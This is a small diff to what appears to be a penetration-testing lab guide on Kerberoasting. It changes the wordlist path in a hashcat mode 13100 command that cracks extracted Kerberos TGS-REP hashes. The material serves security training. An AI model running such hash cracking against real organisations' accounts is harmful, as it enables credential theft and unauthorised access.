@@ -305,7 +305,7 @@ Kerberoasting with GetUserSPNs.py
 Crack the extracted hashes using Hashcat mode 13100 (Kerberos 5 TGS-REP):
 
 ```bash
-hashcat -m 13100 ~/tgs_hashes.txt /usr/share/eaphammer/wordlists/rockyou.txt --force
+hashcat -m 13100 ~/tgs_hashes.txt ~/OTO-labs/supp/lab_files/wordlists/rockyou.txt --force
 ```
 
 ???- note "Command Options/Arguments Explained"
